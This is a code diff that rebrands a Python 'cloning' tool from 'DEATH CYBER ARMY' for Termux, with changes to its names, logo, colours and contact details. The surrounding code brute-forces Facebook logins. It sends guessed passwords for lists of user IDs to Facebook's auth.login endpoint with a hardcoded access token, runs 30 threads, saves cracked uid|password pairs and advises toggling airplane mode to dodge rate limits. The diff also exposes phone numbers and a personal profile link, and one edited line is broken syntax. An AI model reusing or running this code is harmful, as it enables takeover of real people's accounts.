@@ -84,8 +84,8 @@ def clear():
 def back():
 	login()
 
-TALHA="DEATH CYBAR ARMY"
-imt="-DCA=="
+SAFOR="Sago-"
+imt="-Busra4786=="
 ak="Lover-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
@@ -255,7 +255,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \033[1;32mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -275,7 +275,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \033[1;32mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -390,64 +390,22 @@ def follow(ses,coki):
 logo = ("""\033[1;31m
        
 
-
-.                       :--==+===+*#*===#%%**+-.:-*==---=-::****=:                       .
-.                       -=+**%*+*+-+####%%%#*==-===-::.:--=-::::::                       .
-.                       =##%%#####-=**+-#%%#**=+++=:--=-:--=+:-=--                       .
-.                       =#########=-+*+++#*+*+++=+-.-+===:.:--=**+                       .
-.                       =#########*-:=*=*##*+*+*--:::-==+=----=**=                       .
-.                       =#####+****%###+***+*#*-::-=======---=++#*                       .
-.                       =###*****######%%#+#*+=.:+*+==-+==++*#%*%*                       .
-.                       =*********#%+--=******+-++----.:--:-++*#%=                       .
-.                       =*+++-:+*==*%#*#*++*#++=+--:--::--::---==-                       .
-.                       ==:-=+:++:-*#%#===-:+===+++-----++-:::::-:                       .
-.                       =*+=-===*--=*#+ ::  +=====+--=-+*#==---:::                       .
-.                       -+=*#+*+*#%%###+::*.++++===+*%%##%%#*+=--:                       .
-.                       :***#*+=-:*%%**-=-..+*:-===+*#%%%#%%%*:---                       .
-.                       -+*+=-=-::+**#*=:.:*@+ -+*#+-:::=##%#+.:-:                       .
-.                       -=+*==+=---=*##*=.:*+::*%#*+++:::-*+*-...                         
-.                       ...-#*=*%%*+==--:=#+-==#**===-::::*+#- ..                         
-.                       .-=+###*##-:::==**##+=**+++++:.:-=**#: .   ...:::::..             
-.                       :*#*****##::-==++***####***+==:::=**+:.:-=-:::::---.-=-:.         
-.                       -***#***%#-=++##*++++++==++**=--=***+---=:.         ..:-::.       
-.                       -#++#@###%++*#*++++********+*#**###+==-:.               :=-:.     
-.                       -##+*%@%%%+==+%###********##*+=+##*==-...      :.         :--:    
-.                       .=#**%@%%%+*###+=++*++++++++##**#*=:-....   ...:.:..       -=:.   
-.                       .=#*#%@%@#*+**##############%#++=-=-:.... :..--++-::.:      ---   
-.                       -=-+%@@@@*+++*#++*++=++=++++=#*==-=.:....   :--=+--         :=-   
-.                       :=-+%@@@@#+=+*##############+#+==-=.:.....    .....         :.:.  
-.                       -#%@@%*@@@*+=*#*+**+=+====+=+*+==:---..::. .  .....  ....   ::-   
-.                     -*@@*-+:=*@@++++*%##*#*******#**+-:=:--..:::... . ::. ....   :-.:   
-.                 .+%%@@++:*+@%@@@+=+*+*#*###%#++++==#=:.:===:....   .::.:.       :-:-    
-.              -*@%@-*=%@@%@@@**#@+=+***#*++*####*==+*-:..:===-...              .--::     
-.          .:#@*#-+:-#@%%-+=*#*%@@*=+***%##*++#%#++*#=.:...:====::            .--.:.      
-.       -+@##@@#-#*@@#=.-+-=+%%%%@*++**+%%##%%%@@%%##=.:...:::---=-.:......:.---..        
-.   .=#@**++#-@%%%+:    .--=*--#@@*+++*+#%%%%%#%%%%%##.::..::...::..::--:=::..           .
-.  -@*+%:-+##@#         =*===-+%@@*+++*+#%%%%%**%%%%##:::..:::..:.                       .
-.  -@+++%%%+:           -----:=@@@++=+*+#@%%%%*=@%%%%#-::..:::..:.                       .
-.   :+#*=.              :-==***@@@++++***%%%%%*-#%%%%#-::..:-:..:.                       .
-.                       -*+=#@@@@%=+=++**%@%%%#==@%%%#-:::.:-:..:.                       .
-.                       :==*%@@@@#=+==*+##@%%%#=-@@%%#::-:.:-:..:.                       .
-.                       .:-+*%@@@*-===++*#@@%%#=-#@@%%-:-::--:..:.                       .
-.                       :-:-:=%@@*-=--+*##%@%%%=-=@%%%*--::--:..-.                       .
-.                       :---+%@@@+-==-+**#%%%%%+--@%%%#--::=-:..-.                       .
-.                       .::+%%@@@=-==-=*###@%%%*-:#%%%#---:*-::.:.                       .
-.                       -==*%%%%@=-=---+*##%@%%*-:+@%%#::::%::..:.                       .
-.                       -++*++*#=---::::+*##%%%#::-@@%#..::-.:..:.                       .
-.                       -+****++=--:::::-+**%@%%=--%@%%-----::::::                       .
-.                       -*##%#++*++++++++#%%@@@%##*%@%%#*******++=                       .
-\033
-__________________×______________
+██████╗░░░░░░░░█████╗░░░░░░░░█████╗░
+██╔══██╗░░░░░░██╔══██╗░░░░░░██╔══██╗
+██║░░██║█████╗██║░░╚═╝█████╗███████║
+██║░░██║╚════╝██║░░██╗╚════╝██╔══██║
+██████╔╝░░░░░░╚█████╔╝░░░░░░██║░░██║
+╚═════╝░░░░░░░░╚════╝░░░░░░░╚═╝░░╚═╝
+                                                                             \033
+__________________×______________________
   
   Owner   :  DEATH CYBER ARMY
  
-  Github   :  Tan-Vai
+  Github   :  Tan-vai
 
-  Facebook : Abu Tanim
+  Facebook : https://www.facebook.com/abutanim.chowdury
   
-  Position    : CEO
-  
-  Contact : +8801843598985
+  Contact : 01843598985
 __________________×______________________\033[1;31m""")
 
 class Main:
@@ -464,16 +422,16 @@ class Main:
 		print(" [4] 2009-10 Cloning")
 		print(" [5] 2011-14 Cloning")
 		print(" [E] Exit Programming\n")
-		TALHA =input(" Choose : ")
-		if TALHA in ["1", "01"]:
+		SAGOR =input(" Choose : ")
+		if SAGOR in ["1", "01"]:
 			File()
-		if TALHA in ["2", "02"]:
+		if SAGOR in ["2", "02"]:
 			Public()
-		if TALHA in ["3", "03"]:
+		if SAGOR in ["3", "03"]:
 			os.system("python Dump.py")
-		if TALHA in ["4", "04"]:
+		if SAGOR in ["4", "04"]:
 			self.old()
-		if TALHA in ["5", "05"]:
+		if SAGOR in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -876,7 +834,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ BCF-71 ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ DCA] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -893,8 +851,8 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[ DCA-OK ] %s | %s\033[0;97m         "%(uid, pw))
-				print ("\r \033[1;31m Congrats Bro ")
+				print("\r \033[0;92m[ DCA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-DCA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
@@ -1303,7 +1261,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ Finding ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [DCA] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1320,7 +1278,7 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ DCA-OK ] %s | %s\033[0;31m         "%(uid, pw))
+				print("\r \033[0;92m[ DCA-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-DCA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
@@ -1337,7 +1295,7 @@ class Main:
 
 
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrTALHA-cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.mrSAGOR-cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://pastebin.com/p3jbWM14").text
@@ -1353,14 +1311,14 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;31m TAN Toll Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;31m Tan vaiToll Paid You Need Get Approved First\033[1;37m\n")
 		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
 		print(" Copy And Send Key To Admin")
 		print ("")
-		print (" Your Key : "+ak+Talha+key1)
+		print (" Your Key : "3491mvaia)
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
@@ -1369,4 +1327,4 @@ def Subscraption():
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Talha+''+key1
 		os.system('am start https://wa.me/+8801304002896?text=' + tks)
 		Subscraption()        
-Main()
+Main() 
